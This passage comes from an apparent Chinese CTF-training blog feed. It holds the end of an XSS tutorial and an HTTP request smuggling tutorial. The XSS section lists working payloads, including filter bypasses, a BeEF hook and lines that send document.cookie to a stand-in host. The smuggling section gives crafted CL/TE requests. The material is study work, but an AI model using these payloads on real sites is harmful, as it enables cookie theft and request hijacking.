脚本"></a>构造 XSS 脚本</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs xml">弹窗警告<br>此脚本实现弹窗框提示，一般作为漏洞测试或者演示使用，类似SQL注入测试中的单引号，一旦脚本能执行，也就意味着后端服务器没有对特殊字符做过滤 <span class="hljs-tag">&lt;&gt;</span> \ &#x27; ,这样就可以证明，这个页面存在xss漏洞。<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面嵌套<br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">300</span> <span class="hljs-attr">height</span>=<span class="hljs-string">300</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://www.baidu.com</span> <span class="hljs-attr">width</span>=<span class="hljs-string">0</span> <span class="hljs-attr">height</span>=<span class="hljs-string">0</span> <span class="hljs-attr">border</span>=<span class="hljs-string">0</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>页面重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">windows.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">location.href=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>弹窗警告并重定向<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&quot;hello world!&quot;</span>);location.href=<span class="hljs-string">&quot;http:/www.baidu.com&quot;</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br>访问恶意代码<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.xxx.com/xx.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>可结合 beef 收集用户cookie<br><br>巧用图片标签<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://BeFF_IP:3000/book.js&quot;</span>&gt;</span><br><br>绕开过滤的脚本<br>大小写 <span class="hljs-tag">&lt;<span class="hljs-name">ScRIpt</span>&gt;</span><span class="javascript">alert(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">ScRiPT</span>&gt;</span><br>字符编码  采用URL、Base64 等编码<br>javasc<span class="hljs-symbol">&amp;#x72;</span>ipt:alert(123)<br><br>收集用户cookie<br>打开新窗口并且采用本地cookie访问目标页，<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">window</span>.open(<span class="hljs-string">&quot;http://www.baidu.com/cookie.php?cookie=&quot;</span>+<span class="hljs-built_in">document</span>.cookie<span class="hljs-string">&quot;)</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.location=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/cookie.php?cookie=<span class="hljs-string">&quot;+document.cookie&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/img&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;iframe src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie&gt;&lt;/iframe&gt;</span></span><br><span class="hljs-string"><span class="hljs-tag">&lt;script&gt;new Image().src=&quot;</span><span class="hljs-attr">http:</span>//<span class="hljs-attr">www.baidu.com</span>&quot;/<span class="hljs-attr">cookie.php</span>?<span class="hljs-attr">cookie</span>=<span class="hljs-string">&quot;+document.cookie;img.width=0;img.height=0;&lt;/script&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.利用&lt;&gt;标记，构造&lt;script&gt;标签可执行 javascript 的 xss 代码。</p><p>xss 过滤函数需过滤&lt;&gt;&lt;script&gt;&lt;/script&gt;等字符。</p><p>2.利用 html 标签属性支持 javascript:伪协议（支持标签属性的有 href、lowsrc、bgsound、background、value、action、dynsrc 等），执行 xss 代码。</p><p>xss 过滤函数需过滤 JavaScript 等关键字。</p><p>3.利用 javascript 在引号中只用分号分隔单词或强制语句结束，用换行符忽略分号强制结束一个完整语句，而忽略回车、空格、tab 等键，绕过对 javascript 的关键字的过滤。</p><p>4.利用 html 标签属性值支持 ascii 码，对标签属性值进行转码进行规则库的绕过。</p><p>xss 过滤函数需过滤&amp;#\等字符。</p><p>5.利用事件处理函数，触发事件，执行 xss 代码。例如<code>&lt;img src=&#39;#&#39; onerror=alert(/xss/)&gt;</code>,当浏览器响应页面时，找不到图片的地址，触发 onerror 事件。</p><p>6.利用 css 执行 javascript 代码</p><blockquote><p>css 代码中利用 expression 触发 xss 漏洞。如下所示：</p><p>&lt;div style=”width: expression(alert(‘xss’));&gt;</p><p>&lt;img src=”#” style=”xss:expression(alert(/xss/));”&gt;</p><p>&lt;style&gt;body {background-image:expression(alert(“xss”));}&lt;/style&gt;</p><p>&lt;div style=”list-style-image:url(javascript:alert(‘xss’))”&gt;</p><p>css 代码中利用@import 触发 xss</p><p>&lt;stytle&gt;</p><p>@import ‘javascript:alert(“XSS”)’;</p><p>&lt;/stytle&gt;</p><p>css 代码中使用@import 和 link 方式导入外部含有 xss 代码的样式表文件</p><p>&lt;link rel=”stytlesheet” href=”<a href="http://www.***.com/a.css&quot;&gt;">http://www.***.com/a.css&quot;&gt;</a></p><p>&lt;stytle type=’text/css’&gt;@import url(<a href="http://www.*.com/a.css);/">http://www.*.com/a.css);\</a></style></p><p>xss 过滤函数需过滤 style 标签、style 属性、expression、javascript、import 等关键字。</p></blockquote><p>7.利用大小写混淆、使用单引号、不使用引号、使用/插入在 img src 中间、构造不同的全角字符、运用/**/混淆过滤规则来绕过过滤函数</p><p>8.利用字符编码。javascript 支持 unicode、escapes、十六进制、八进制等编码形式。</p><img src='#' onerror=alert(/hacked/)>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP走私攻击</title>
    <link href="/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"/>
    <url>/2021/06/04/HTTP%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h3 id="0x01-HTTP请求走私是什么"><a href="#0x01-HTTP请求走私是什么" class="headerlink" title="0x01 HTTP请求走私是什么"></a>0x01 HTTP请求走私是什么</h3><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><h3 id="0x02-为什么会产生HTTP请求走私"><a href="#0x02-为什么会产生HTTP请求走私" class="headerlink" title="0x02 为什么会产生HTTP请求走私"></a>0x02 为什么会产生HTTP请求走私</h3><p><strong>请求走私漏洞成因</strong></p><blockquote><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p></blockquote><p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。<br> 同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</p><p><strong>RFC2616规范</strong></p><blockquote><p>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。</p></blockquote><p>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。</p><p><strong>走私攻击实现</strong><br> 当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p><h4 id="扩展：为什么会出现多次请求"><a href="#扩展：为什么会出现多次请求" class="headerlink" title="扩展：为什么会出现多次请求"></a>扩展：为什么会出现多次请求</h4><p>这与最为广泛的HTTP 1.1的协议特性——<code>Keep-Alive&amp;Pipeline</code>有关。<br> 在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。<br> 而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p><strong>Keep-Alive</strong>：在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭<code>TCP链接</code>，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在<code>HTTP1.1</code>中默认开启的。<br> **Pipeline(http管线化)**：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的<code>HTTP</code>请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现在，浏览器默认不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。<br> 下面这是典型的CDN加速图和拓扑结构图<br> CDN加速图<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233501-56f060b8-f8cf-1.jpg"><br> 拓扑结构图<br> <img src="https://xzfile.aliyuncs.com/media/upload/picture/20191027233515-5f360af2-f8cf-1.png"></p><h3 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h3><p>HTTP请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><blockquote><p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。<br> TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。<br> TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p></blockquote><h3 id="0x04-HTTP请求走私攻击的五种方式"><a href="#0x04-HTTP请求走私攻击的五种方式" class="headerlink" title="0x04 HTTP请求走私攻击的五种方式"></a>0x04 HTTP请求走私攻击的五种方式</h3><h4 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h4><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br> 前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p><strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 44<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">\r\n`是换行的意思，windows的换行是`\r\n`，unix的是`\n`，mac的是`\r<br></code></pre></td></tr></table></figure></blockquote><p><strong>攻击流程</strong>：<br> 前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br> 然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求，分别是：</p><p>第一个：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>第二个：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET / secret HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>所以造成了请求走私。</p><h4 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h4><p><strong>RFC7230规范</strong></p><blockquote><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p></blockquote><p>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br> 但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 8<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 7<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><br>12345<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br> 而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。<br> 如果此时有一个其他的正常用户对服务器进行了请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">GET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aGET /index.html HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>这时，用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p><p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br> 所以想到前面所说的<br> <strong>RFC2616规范</strong></p><blockquote><p>如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。</p></blockquote><p>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。</p><h4 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h4><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</p><p><strong>chunk传输数据(size的值由16进制表示)</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size = <span class="hljs-number">0</span>][\r\n][\r\n]<br></code></pre></td></tr></table></figure><p><strong>chunked编码</strong><br> 参考：<a href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a><br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Connection: keep-alive<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 6<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>连续发送几次请求就可以获得响应。<br> <strong>攻击流程</strong>：<br> 由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>a<br></code></pre></td></tr></table></figure><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为已经读取到结尾了。<br> 但剩下的字母<code>a</code>就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br></code></pre></td></tr></table></figure><p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p><h4 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h4><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-Length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取完毕了。<br> 此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">12<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p><h4 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h4><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code>。<br> <strong>构造请求示例</strong>：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">POST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Host: test.com<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>......<br>Content-length: 4<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-Encoding: chunked<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Transfer-encoding: cow<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br> 前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取结束。<br> 此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理<code>Transfer-encoding</code>请求头，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。读取到</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">5c<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>认为是读取完毕了。后面的数据就认为是另一个请求：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">aPOST / HTTP/1.1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>Content-Type: application/x-www-form-urlencoded<span class="hljs-symbol">\r</span><span 